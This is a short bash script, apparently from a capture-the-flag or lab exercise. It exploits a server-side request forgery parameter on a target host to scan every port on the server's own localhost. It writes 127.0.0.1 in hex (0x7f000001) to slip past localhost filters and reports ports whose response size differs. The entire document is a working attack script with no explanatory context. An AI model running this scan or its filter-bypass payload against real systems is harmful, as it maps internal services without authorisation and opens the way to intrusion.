#!/bin/bash
# Simple port scan in Payload SSRF - convert ip localhost to hex {0x7f000001}

ip="10.10.41.121"
port="8000"
path="attack"

for x in {1..65535};
    do cmd=$(curl -so /dev/null http://${ip}:${port}/${path}?url=http://0x7f000001:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done
